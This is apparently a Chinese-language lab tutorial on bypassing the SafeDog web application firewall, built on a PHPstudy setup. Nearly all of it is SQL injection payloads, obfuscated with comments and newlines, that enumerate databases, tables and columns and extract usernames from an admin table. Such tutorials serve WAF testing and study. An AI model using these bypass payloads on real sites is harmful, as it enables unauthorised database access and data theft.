![](https://p3.ssl.qhimg.com/t010c39f4110b694beb.jpg)

## 前言

在做项目中遇到各种各样waf，跟着本文系列一起学习bypass。

## 安装

环境：win+PHPstudy+安全狗

## 过程

安装phpstudy需要以系统模式启动，否则安全狗无法识别安装防护插件。

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)

## 进入主题

### 1.判断注入：

```
and 1=1 拦截
and -1=-1拦截
and /*/ /-- /*/1=1 不拦截
```

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)

### 2.order by：

```
order by 1 拦截
```

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)

```
order/*//*/ by 1 不拦截
```

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)

### 3.联合查询

```
and 1=2 union select 拦截
```

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)

```
注释+换行符绕过
and /*/%0A*a*/1=2 union/*/ /-- /*/select 1,2 不拦截
```

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)

### 4.爆库：

```
and /*/%0A*a*/1=2 union/*/ /-- /*/select%201,database() 拦截
and /*/%0A*a*/1=2 union/*/ /-- /*/select%201,database/*/ /-- /*/()不拦截
```

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)

### 5.爆表：

```
用以上方法bypass绕过
/*!and*/ /*/%0A*a*/1=2 /**//**/union/*/ /-- /*/ /*/%0A*a*/select 1,table_name /*!from--/*information_schema.tables*/ /*//*/where table_schema=/*!database*//*/ /-- /*/() limit 0,1 不拦截
```

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)

### 6.获取列名

```
%20/*!and*/%20/*/%0A*a*/1=2%20/**//**/union/*/%20/--%20/*/%20/*/%0A*a*/select%201,column_name%20/*!from--%0F/*%0Ainformation_schema.columns*/%20/*//*/where%20table_schema=/*!database*//*/%20/--%20/*/()%20limit%200,1 不拦截
```

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)

### 7.获取字段：

```
union/*/%20/--%20/*/select%201,/*!username*/%20/*//*!--+*/from%20admin%20limit%201,1
```

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)

## 总结

手法采用了大量注释+换行来达到bypass效果。  
如文中有误请不吝指正

## 参考文献

[https://github.com/aleenzz/MYSQL\_SQL\_BYPASS\_WIKI](https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI)